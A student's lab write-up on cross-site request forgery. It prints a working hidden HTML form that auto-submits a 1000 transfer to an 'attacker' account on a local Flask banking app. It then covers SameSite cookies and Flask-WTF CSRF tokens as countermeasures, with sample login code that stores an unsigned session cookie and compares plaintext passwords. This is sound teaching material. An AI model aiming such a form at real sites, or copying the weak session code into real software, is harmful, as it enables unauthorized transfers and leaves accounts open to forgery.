# 19110113, Phạm Ngọc Duy Đan
# Lab 2: CSRF attack lab

#  Task 1: normal transaction with CRSF vulnerability

## 1.1. Login, Check balance
 First we have a `hiddenform.html` file:
 
    <!DOCTYPE html>
    <html>
    <body>
    <h1>Win a Prize!</h1>
    <form id="csrf-form" action="http://localhost:8000/transfer" method="POST" style="display:none;">
        <input type="hidden" name="to" value="attacker">
        <input type="hidden" name="amount" value="1000">
    </form>
    
    <script>
        window.onload = function() {
            document.getElementById("csrf-form").submit();
        }
    </script>
    </body>
    </html>
    
And `target.py` file:

    
   <img width="726" alt="Screenshot 2023-05-02 165126" src="https://github.com/Will-Zidane/SecurityLab/blob/main/Photo/Lab2%20Photo/code1.png?raw=true">

So first I open page in port 8000:

 <img width="726" alt="Screenshot 2023-05-02 165126" src="https://github.com/Will-Zidane/SecurityLab/blob/main/Photo/Lab2%20Photo/Screenshot%202024-07-06%20at%2019.21.03.png?raw=true">
 
 So first I login in Alice account:

  <img width="726" alt="Screenshot 2023-05-02 165126" src="https://github.com/Will-Zidane/SecurityLab/blob/main/Photo/Lab2%20Photo/Screenshot%202024-07-06%20at%2019.21.16.png?raw=true">

  <img width="726" alt="Screenshot 2023-05-02 165126" src="https://github.com/Will-Zidane/SecurityLab/blob/main/Photo/Lab2%20Photo/Screenshot%202024-07-06%20at%2019.21.21.png?raw=true">

And then I check the balance:

  <img width="726" alt="Screenshot 2023-05-02 165126" src="https://github.com/Will-Zidane/SecurityLab/blob/main/Photo/Lab2%20Photo/Screenshot%202024-07-06%20at%2019.21.28.png?raw=true">
  
  We can see Alice have 10000$
## 1.2. Doing the transaction

So in the next step we will transfer the money to Bob:

    
  <img width="726" alt="Screenshot 2023-05-02 165126" src="https://github.com/Will-Zidane/SecurityLab/blob/main/Photo/Lab2%20Photo/Screenshot%202024-07-06%20at%2019.22.39.png?raw=true">
  And the transfer is success to Bob's account:
  
 <img width="726" alt="Screenshot 2023-05-02 165126" src="https://github.com/Will-Zidane/SecurityLab/blob/main/Photo/Lab2%20Photo/Screenshot%202024-07-06%20at%2019.22.34.png?raw=true">
    
  
## 1.3.Tranfer money illegitimately

  So assume that Alice will click a hidden form of attacker during logging in the account it will direct Alice to hidden form when she doesn't know it and the money will transfer to the attacker:
  
 <img width="726" alt="Screenshot 2023-05-02 165126" src="https://github.com/Will-Zidane/SecurityLab/blob/main/Photo/Lab2%20Photo/Screenshot%202024-07-06%20at%2019.35.48.png?raw=true">
 
   

# Task 2:  CSRF Countermeasure implementation
## 2.1. Solution 1:
The SameSite attribute for cookies can help prevent CSRF by not sending cookies with cross-site requests. Here’s how to set it in Flask:

Set the SameSite Attribute on the Session Cookie:

Modify the set_cookie call to include the SameSite attribute:

        from flask import Flask, request, make_response, render_template_string, session
        import json
        
        app = Flask(__name__)
        
        # Existing code remains the same
        
        @app.route('/login', methods=['GET', 'POST'])
        def login():
            if request.method == 'POST':
                username = request.form['username']
                password = request.form['password']
                if username in user_accounts and user_accounts[username]['password'] == password:
                    resp = make_response(f"Logged in as {username}")
                    # Setting the SameSite attribute to 'Lax' or 'Strict'
                    resp.set_cookie('user_session', json.dumps({'username': username}), samesite='Lax')
                    return resp
                else:
                    return "Invalid credentials", 401

SameSite=Lax: The cookie is withheld on cross-site subrequests (like loading images), but is sent when a user navigates to the URL from an external site (e.g., by following a link).

SameSite=Strict: The cookie is withheld on all cross-site requests, including following a link from an external site.

And it will tell we to login :

 <img width="726" alt="Screenshot 2023-05-02 165126" src="https://github.com/Will-Zidane/SecurityLab/blob/main/Screenshot%202024-07-06%20at%2019.53.33.png?raw=true">



## 2.2. Solution 2

Generate and Validate CSRF Tokens:

You can use the Flask extension Flask-WTF which provides CSRF protection by default.

First, install the extension:
`pip install Flask-WTF`

Update your application:
    from flask import Flask, request, make_response, render_template_string, session
    from flask_wtf import CSRFProtect
    import json
    
    app = Flask(__name__)
    app.config['SECRET_KEY'] = 'a_secret_key'  # Ensure this is a secure key in production
    csrf = CSRFProtect(app)


    <form method="post">
        <!-- Hidden CSRF token field automatically included by Flask-WTF -->
        To account: <input type="text" name="to"><br>
        Amount: <input type="number" name="amount"><br>
        <input type="submit" value="Transfer">
    </form>

# Existing code remains the same


discord Link: https://github.com/Will-Zidane/SecurityLab/edit/main/19110113.md
 
